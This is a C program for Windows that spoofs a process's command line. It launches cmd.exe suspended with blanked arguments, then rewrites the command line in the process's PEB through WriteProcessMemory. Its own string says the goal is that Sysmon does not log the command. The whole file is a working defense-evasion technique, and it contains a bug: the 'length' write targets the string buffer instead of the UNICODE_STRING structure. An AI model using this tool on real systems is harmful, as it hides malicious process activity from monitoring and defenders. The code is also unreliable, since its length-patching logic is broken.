#include <stdio.h>
#include <string.h>
#include <windows.h>
#include <winternl.h>
#include <stddef.h>

void replaceArguementsWithSpaces(const char *original, char *modified) {
    const char *firstSpace = strchr(original, ' ');
    if (firstSpace != NULL) {
        size_t length = firstSpace - original + 1;
        strncpy(modified, original, length);
        memset(modified + length, ' ', strlen(original) - length);
        modified[strlen(original)] = '\0';
    } else {
        strcpy(modified, original);
    }
}

int main() {
    BOOL status = FALSE;
    const char *lolBinCommand = "cmd.exe /k echo This will not be logged in sysmon test";

    // Create spoofed cmdline
    char spoofedCmdline[MAX_PATH];
    replaceArguementsWithSpaces(lolBinCommand, spoofedCmdline);

    // Convert realCmdline to wide character string
    int realCmdlineLen = MultiByteToWideChar(CP_UTF8, 0, lolBinCommand, -1, NULL, 0);
    wchar_t *realCmdlineW = (wchar_t *)malloc(realCmdlineLen * sizeof(wchar_t));
    MultiByteToWideChar(CP_UTF8, 0, lolBinCommand, -1, realCmdlineW, realCmdlineLen);

    // Convert realCmdline to wide character string
    int spoofedCmdlineLen = MultiByteToWideChar(CP_UTF8, 0, spoofedCmdline, -1, NULL, 0);
    wchar_t *spoofedCmdlineW = (wchar_t *)malloc(spoofedCmdlineLen * sizeof(wchar_t));
    MultiByteToWideChar(CP_UTF8, 0, spoofedCmdline, -1, spoofedCmdlineW, spoofedCmdlineLen);

    // Create suspended process
    printf("[+] Creating the process suspended\n");
    STARTUPINFOEX si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    if (!CreateProcessA(NULL, spoofedCmdline, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si.StartupInfo, &pi)) {
        goto cleanup;
    }

    // Get PROCESS_BASIC_INFORMATION structure
    printf("[+] Reading the PROCESS_BASIC_INFORMATION structure\n");
    PROCESS_BASIC_INFORMATION pbi;
    ULONG ret;
    if (NtQueryInformationProcess(pi.hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &ret) != 0) {
        goto cleanup;
    }
    printf("[+] PEB base address: %p\n", pbi.PebBaseAddress);

    // Get PEB structure
    printf("[+] Reading the PEB structure\n");
    PEB peb;
    if (!ReadProcessMemory(pi.hProcess, (PBYTE)pbi.PebBaseAddress, &peb, sizeof(peb), NULL)) {
        goto cleanup;
    }
    printf("[+] Process parameters address: %p\n", peb.ProcessParameters);

    // Get RTL_USER_PROCESS_PARAMETERS structure
    printf("[+] Reading the RTL_USER_PROCESS_PARAMETERS structure\n");
    RTL_USER_PROCESS_PARAMETERS procParams;
    if (!ReadProcessMemory(pi.hProcess, peb.ProcessParameters, &procParams, sizeof(procParams), NULL)) {
        goto cleanup;
    }
    printf("[+] Command line address: %p\n", procParams.CommandLine.Buffer);

    // Change command line
    if (!WriteProcessMemory(pi.hProcess, procParams.CommandLine.Buffer, realCmdlineW, realCmdlineLen * sizeof(wchar_t), NULL)) {
        goto cleanup;
    }

    // Address of CommandLine in target process
    UNICODE_STRING commandLine;
    if (!ReadProcessMemory(pi.hProcess, (PBYTE)procParams.CommandLine.Buffer, &commandLine, sizeof(commandLine), NULL)) {
        goto cleanup;
    }
    
    // Calculate the address of the Length field
    PBYTE lengthAddress = (PBYTE)procParams.CommandLine.Buffer + offsetof(UNICODE_STRING, Length);
    
    // New length in bytes (set this to the desired length)
    USHORT newLength = 7 * sizeof(wchar_t);  // 7 characters (e.g., "cmd.exe") in wide characters
    
    // Write the new length
    if (!WriteProcessMemory(pi.hProcess, lengthAddress, &newLength, sizeof(USHORT), NULL)) {
        goto cleanup;
    }

    // Resume process
    printf("[+] Resuming the main thread\n");
    ResumeThread(pi.hThread);
    
    return TRUE;
cleanup:
    free(realCmdlineW);
    return status;
}
